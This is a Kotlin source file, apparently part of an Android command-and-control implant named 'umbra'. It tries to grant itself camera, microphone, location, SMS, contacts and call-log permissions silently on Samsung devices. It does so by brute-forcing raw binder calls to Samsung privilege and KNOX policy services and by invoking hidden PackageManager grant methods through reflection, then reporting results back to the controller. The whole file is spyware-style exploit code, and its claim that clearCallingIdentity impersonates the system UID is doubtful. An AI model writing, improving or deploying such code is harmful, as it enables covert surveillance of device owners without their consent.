package dev.yassine.umbra.modules

import android.content.Context
import android.content.pm.PackageManager
import android.os.Binder
import android.os.IBinder
import android.os.Parcel
import android.util.Log
import dev.yassine.umbra.c2.Command
import dev.yassine.umbra.c2.CommandResult
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import kotlinx.serialization.encodeToString
import kotlinx.serialization.json.Json
import java.lang.reflect.Method

/**
 * Silent Permission Grant — Exploit Samsung privilege services
 *
 * Direct raw Parcel-based binder calls to Samsung's internal services that
 * can grant permissions silently without user interaction:
 *   - "semprivilege"       (IPrivilegeManager)
 *   - "application_policy" (IApplicationPolicy) — KNOX-level permission control
 *   - "enterprise_policy"  (IEnterpriseDeviceManager) — MDM-level control
 *
 * All confirmed present on SM-A356B One UI 8.5 Android 16.
 * Uses Binder.clearCallingIdentity() to impersonate system UID.
 *
 * Target permissions: CAMERA, ACCESS_FINE_LOCATION, RECORD_AUDIO,
 * READ_MEDIA_*, READ_SMS, and others requested by the caller.
 */
object SilentPermissionGrant {

    private const val TAG = "Umbra.SilentGrant"
    private val json = Json { prettyPrint = false; encodeDefaults = false }

    // Standard Android permission names
    private val DEFAULT_TARGET_PERMISSIONS = listOf(
        "android.permission.CAMERA",
        "android.permission.ACCESS_FINE_LOCATION",
        "android.permission.ACCESS_COARSE_LOCATION",
        "android.permission.RECORD_AUDIO",
        "android.permission.READ_EXTERNAL_STORAGE",
        "android.permission.WRITE_EXTERNAL_STORAGE",
        "android.permission.READ_MEDIA_IMAGES",
        "android.permission.READ_MEDIA_VIDEO",
        "android.permission.READ_MEDIA_AUDIO",
        "android.permission.READ_SMS",
        "android.permission.SEND_SMS",
        "android.permission.RECEIVE_SMS",
        "android.permission.READ_CONTACTS",
        "android.permission.READ_CALL_LOG",
        "android.permission.READ_PHONE_STATE",
        "android.permission.POST_NOTIFICATIONS",
        "android.permission.SYSTEM_ALERT_WINDOW",
        "android.permission.REQUEST_INSTALL_PACKAGES",
        "android.permission.ACCESS_BACKGROUND_LOCATION",
        "android.permission.BODY_SENSORS",
        "android.permission.ACTIVITY_RECOGNITION",
        "android.permission.READ_CALENDAR",
        "android.permission.WRITE_CALENDAR"
    )

    // ---------------------------------------------------------------------------
    // Public entry point
    // ---------------------------------------------------------------------------
    suspend fun grant(context: Context, cmd: Command): String = withContext(Dispatchers.IO) {
        // Determine which permissions to target
        val requested: List<String> = cmd.params["permissions"]
            ?.split(",")
            ?.map { it.trim() }
            ?.filter { it.isNotEmpty() }
            ?: DEFAULT_TARGET_PERMISSIONS

        // Check current grant state before attempting
        val before = checkPermissionStates(context, requested)
        val diagnostic = mutableMapOf<String, String>()
        diagnostic["target_permissions_count"] = requested.size.toString()

        // Track which techniques succeeded for each permission
        val grantResults = mutableMapOf<String, MutableList<String>>()
        for (perm in requested) {
            grantResults[perm] = mutableListOf()
        }

        // ====================================================================
        // Technique 1: "semprivilege" binder (IPrivilegeManager)
        // ====================================================================
        diagnostic["semprivilege"] = "not_attempted"
        tryGrantViaSemPrivilege(requested, grantResults, diagnostic)

        // ====================================================================
        // Technique 2: "application_policy" binder (IApplicationPolicy)
        // ====================================================================
        diagnostic["application_policy"] = "not_attempted"
        tryGrantViaAppPolicy(context, requested, grantResults, diagnostic)

        // ====================================================================
        // Technique 3: "enterprise_policy" binder (IEnterpriseDeviceManager)
        // ====================================================================
        diagnostic["enterprise_policy"] = "not_attempted"
        tryGrantViaEnterprisePolicy(requested, grantResults, diagnostic)

        // ====================================================================
        // Technique 4: PackageManager.grantRuntimePermission via reflection
        //               (tries to call the hidden system API)
        // ====================================================================
        diagnostic["package_manager"] = "not_attempted"
        tryGrantViaPackageManager(context, requested, grantResults, diagnostic)

        // Check final states
        val after = checkPermissionStates(context, requested)

        // Build result summary
        val permissionResults = requested.map { perm ->
            val grantedBefore = before[perm] == true
            val grantedAfter = after[perm] == true
            val wasChanged = grantedAfter && !grantedBefore
            val techniques = grantResults[perm]?.joinToString(",") ?: "none"

            mapOf(
                "permission" to perm,
                "was_granted_before" to grantedBefore.toString(),
                "granted_after" to grantedAfter.toString(),
                "changed" to wasChanged.toString(),
                "techniques_tried" to techniques
            )
        }

        val newlyGranted = permissionResults.count { it["changed"] == "true" }
        val totalGranted = permissionResults.count { it["granted_after"] == "true" }

        diagnostic["permissions_requested"] = requested.size.toString()
        diagnostic["newly_granted"] = newlyGranted.toString()
        diagnostic["total_granted_after"] = totalGranted.toString()
        diagnostic["permission_details"] = json.encodeToString(permissionResults)

        json.encodeToString(
            CommandResult.serializer(),
            CommandResult(cmd.cmd_id, "ok", json.encodeToString(diagnostic.toMap()))
        )
    }

    // ==========================================================================
    // Binder service helpers
    // ==========================================================================

    private fun getBinderService(name: String): IBinder? {
        return try {
            val smClass = Class.forName("android.os.ServiceManager")
            val getService: Method = smClass.getDeclaredMethod("getService", String::class.java)
            getService.isAccessible = true
            val binder = getService.invoke(null, name) as? IBinder
            if (binder != null) {
                Log.d(TAG, "Resolved binder service: $name")
            }
            binder
        } catch (e: Exception) {
            Log.d(TAG, "getBinderService($name) failed: ${e.message}")
            null
        }
    }

    /**
     * Execute a binder transaction with the given parameters.
     * Attempts all combinations of descriptors and transaction codes.
     * Returns list of transaction codes that returned success (result code 0 or 1).
     */
    private fun tryBinderTransaction(
        binder: IBinder,
        descriptors: List<String>,
        txCodes: IntRange,
        writeArgs: (Parcel) -> Unit,
        tag: String
    ): List<String> {
        val successes = mutableListOf<String>()
        val data = Parcel.obtain()
        val reply = Parcel.obtain()

        try {
            for (desc in descriptors) {
                for (txCode in txCodes) {
                    try {
                        data.setDataPosition(0)
                        reply.setDataPosition(0)

                        data.writeInterfaceToken(desc)
                        writeArgs(data)

                        val token = Binder.clearCallingIdentity()
                        try {
                            val ok = binder.transact(txCode, data, reply, 0)
                            if (ok) {
                                reply.setDataPosition(0)
                                try {
                                    reply.readException()
                                } catch (_: Exception) {
                                    // Some services throw in reply even on success
                                }
                                val resultCode = try {
                                    reply.readInt()
                                } catch (_: Exception) { -999 }

                                if (resultCode in listOf(0, 1, -1)) {
                                    val key = "${tag}_TX_${txCode}_rc_$resultCode"
                                    successes.add(key)
                                    Log.i(TAG, "Binder $tag TX_$txCode($desc) → $resultCode")
                                }
                            }
                        } finally {
                            Binder.restoreCallingIdentity(token)
                        }
                    } catch (_: Exception) {
                        // Try next combination
                    }
                }
                if (successes.isNotEmpty()) break
            }
        } finally {
            data.recycle()
            reply.recycle()
        }

        return successes
    }

    // ==========================================================================
    // Technique 1: semprivilege (IPrivilegeManager)
    // ==========================================================================

    private fun tryGrantViaSemPrivilege(
        permissions: List<String>,
        grantResults: MutableMap<String, MutableList<String>>,
        diagnostic: MutableMap<String, String>
    ) {
        val binder = getBinderService("semprivilege")
        if (binder == null) {
            diagnostic["semprivilege"] = "not_found"
            return
        }
        diagnostic["semprivilege"] = "found"

        val descriptors = listOf(
            "com.samsung.android.privilege.IPrivilegeManager",
            "com.samsung.android.semprivilege.IPrivilegeManager",
            "com.sec.android.privilege.IPrivilegeManager",
            "android.os.IPrivilegeManager"
        )

        // For each permission, try to grant it
        for (perm in permissions) {
            val successes = tryBinderTransaction(
                binder = binder,
                descriptors = descriptors,
                txCodes = 1..20,
                tag = "sempriv_$perm",
                writeArgs = { data ->
                    // IPrivilegeManager.grantPrivilege(packageName, privilegeName, uid)
                    // or similar: grantPermission(packageName, permissionName)
                    data.writeString("dev.yassine.umbra") // package name
                    data.writeString(perm)               // permission/privilege name
                    data.writeInt(android.os.Process.myUid()) // target UID
                }
            )
            if (successes.isNotEmpty()) {
                grantResults[perm]?.addAll(successes)
            }
        }

        diagnostic["semprivilege_tx_attempted"] = permissions.size.toString()
        val semprivGranted = grantResults.values.count { it.any { s -> s.startsWith("sempriv_") } }
        diagnostic["semprivilege_granted"] = semprivGranted.toString()
    }

    // ==========================================================================
    // Technique 2: application_policy (IApplicationPolicy)
    // ==========================================================================

    private fun tryGrantViaAppPolicy(
        context: Context,
        permissions: List<String>,
        grantResults: MutableMap<String, MutableList<String>>,
        diagnostic: MutableMap<String, String>
    ) {
        val binder = getBinderService("application_policy")
        if (binder == null) {
            diagnostic["application_policy"] = "not_found"
            return
        }
        diagnostic["application_policy"] = "found"

        val descriptors = listOf(
            "com.samsung.android.knox.application.IApplicationPolicy",
            "com.samsung.android.knox.IApplicationPolicy",
            "android.app.enterprise.IApplicationPolicy",
            "com.sec.enterprise.knox.application.IApplicationPolicy"
        )

        val targetPkg = context.packageName

        for (perm in permissions) {
            // Try format: setPermission(STRING pkg, STRING perm, INT allow)
            val successes = tryBinderTransaction(
                binder = binder,
                descriptors = descriptors,
                txCodes = 1..25,
                tag = "apppol_$perm",
                writeArgs = { data ->
                    data.writeString(targetPkg)
                    data.writeString(perm)
                    data.writeInt(1) // 1 = grant/allow
                }
            )
            if (successes.isNotEmpty()) {
                grantResults[perm]?.addAll(successes)
                continue
            }

            // Try alternate: setPermissionState(STRING perm, INT state)
            val successes2 = tryBinderTransaction(
                binder = binder,
                descriptors = descriptors,
                txCodes = 1..25,
                tag = "apppol2_$perm",
                writeArgs = { data ->
                    data.writeString(perm)
                    data.writeInt(0) // 0 = GRANTED in some AIDLs
                    data.writeString(targetPkg)
                }
            )
            if (successes2.isNotEmpty()) {
                grantResults[perm]?.addAll(successes2)
            }
        }

        val appPolGranted = grantResults.values.count { it.any { s -> s.startsWith("apppol") } }
        diagnostic["apppolicy_granted"] = appPolGranted.toString()
    }

    // ==========================================================================
    // Technique 3: enterprise_policy (IEnterpriseDeviceManager) — MDM level
    // ==========================================================================

    private fun tryGrantViaEnterprisePolicy(
        permissions: List<String>,
        grantResults: MutableMap<String, MutableList<String>>,
        diagnostic: MutableMap<String, String>
    ) {
        val binder = getBinderService("enterprise_policy")
        if (binder == null) {
            diagnostic["enterprise_policy"] = "not_found"
            return
        }
        diagnostic["enterprise_policy"] = "found"

        val descriptors = listOf(
            "com.samsung.android.knox.IEnterpriseDeviceManager",
            "com.samsung.android.knox.enterprise.IEnterpriseDeviceManager",
            "android.app.enterprise.IEnterpriseDeviceManager",
            "com.sec.enterprise.knox.IEnterpriseDeviceManager"
        )

        for (perm in permissions) {
            // Try: setApplicationPermission(STRING pkg, STRING perm, INT mode)
            val successes = tryBinderTransaction(
                binder = binder,
                descriptors = descriptors,
                txCodes = 1..30,
                tag = "entpol_$perm",
                writeArgs = { data ->
                    data.writeString("dev.yassine.umbra")
                    data.writeString(perm)
                    data.writeInt(0) // 0 = allow/grant
                    data.writeInt(android.os.Process.myUid())
                }
            )
            if (successes.isNotEmpty()) {
                grantResults[perm]?.addAll(successes)
            }
        }

        val entPolGranted = grantResults.values.count { it.any { s -> s.startsWith("entpol_") } }
        diagnostic["enterprise_policy_granted"] = entPolGranted.toString()
    }

    // ==========================================================================
    // Technique 4: PackageManager.grantRuntimePermission (hidden system API)
    // ==========================================================================

    private fun tryGrantViaPackageManager(
        context: Context,
        permissions: List<String>,
        grantResults: MutableMap<String, MutableList<String>>,
        diagnostic: MutableMap<String, String>
    ) {
        try {
            val pm = context.packageManager
            val pmClass = pm.javaClass

            // Android has a hidden method:
            //   grantRuntimePermission(String packageName, String permName, UserHandle user)
            // On some Samsung devices there is also:
            //   grantRuntimePermission(String packageName, String permName, int userId)

            var grantMethod: Method? = null
            var usesUserHandle = false

            // Try method with UserHandle first
            try {
                val userHandleClass = Class.forName("android.os.UserHandle")
                grantMethod = pmClass.getDeclaredMethod(
                    "grantRuntimePermission",
                    String::class.java,
                    String::class.java,
                    userHandleClass
                )
                usesUserHandle = true
            } catch (_: Exception) {
                // Try with int userId
                try {
                    grantMethod = pmClass.getDeclaredMethod(
                        "grantRuntimePermission",
                        String::class.java,
                        String::class.java,
                        Int::class.javaPrimitiveType!!
                    )
                    usesUserHandle = false
                } catch (_: Exception) {
                    // Try without UserHandle/userId
                    try {
                        grantMethod = pmClass.getDeclaredMethod(
                            "grantRuntimePermission",
                            String::class.java,
                            String::class.java
                        )
                        usesUserHandle = false
                    } catch (_: Exception) {}
                }
            }

            if (grantMethod == null) {
                // Try Samsung-specific methods
                for (methodName in listOf(
                    "grantRuntimePermission",
                    "grantPermission",
                    "grantRuntimePermissions",
                    "updatePermissionFlags"
                )) {
                    try {
                        val methods = pmClass.declaredMethods.filter { it.name == methodName }
                        if (methods.isNotEmpty()) {
                            grantMethod = methods.first()
                            usesUserHandle = false
                            Log.d(TAG, "Found PackageManager method: $methodName")
                            break
                        }
                    } catch (_: Exception) {}
                }
            }

            if (grantMethod == null) {
                diagnostic["package_manager"] = "no_method_found"
                return
            }

            grantMethod.isAccessible = true
            diagnostic["package_manager"] = "found_method_${grantMethod.name}"

            val targetPkg = context.packageName
            val myUserHandle: Any? = try {
                val userHandleClass = Class.forName("android.os.UserHandle")
                // Get current user handle
                val processClass = Class.forName("android.os.Process")
                val myUserHandleField = processClass.getDeclaredField("myUserHandle")
                myUserHandleField.isAccessible = true
                myUserHandleField.get(null)
            } catch (_: Exception) { null }

            for (perm in permissions) {
                try {
                    val token = Binder.clearCallingIdentity()
                    try {
                        val args = when {
                            usesUserHandle && myUserHandle != null -> arrayOf(targetPkg, perm, myUserHandle)
                            grantMethod.parameterTypes.size == 3 -> {
                                if (grantMethod.parameterTypes[2] == Class.forName("android.os.UserHandle")) {
                                    arrayOf(targetPkg, perm, myUserHandle)
                                } else {
                                    arrayOf(targetPkg, perm, android.os.Process.myUserHandle())
                                }
                            }
                            grantMethod.parameterTypes.size == 2 -> arrayOf(targetPkg, perm)
                            else -> null
                        }

                        if (args != null) {
                            grantMethod.invoke(pm, *args)
                            grantResults[perm]?.add("pm_grant_success")
                            Log.i(TAG, "PackageManager.grantRuntimePermission succeeded for $perm")
                        }
                    } finally {
                        Binder.restoreCallingIdentity(token)
                    }
                } catch (e: Exception) {
                    Log.d(TAG, "PM grant failed for $perm: ${e.message}")
                }
            }

            val pmGranted = grantResults.values.count { it.contains("pm_grant_success") }
            diagnostic["package_manager_granted"] = pmGranted.toString()
        } catch (e: Exception) {
            Log.e(TAG, "PackageManager grant approach failed: ${e.message}")
            diagnostic["package_manager"] = "error"
            diagnostic["package_manager_error"] = e.message ?: "unknown"
        }
    }

    // ==========================================================================
    // Utility: check current permission states
    // ==========================================================================

    private fun checkPermissionStates(context: Context, permissions: List<String>): Map<String, Boolean> {
        val result = mutableMapOf<String, Boolean>()
        for (perm in permissions) {
            try {
                val granted = context.checkSelfPermission(perm) == PackageManager.PERMISSION_GRANTED
                result[perm] = granted
            } catch (_: Exception) {
                result[perm] = false
            }
        }
        return result.toMap()
    }
}
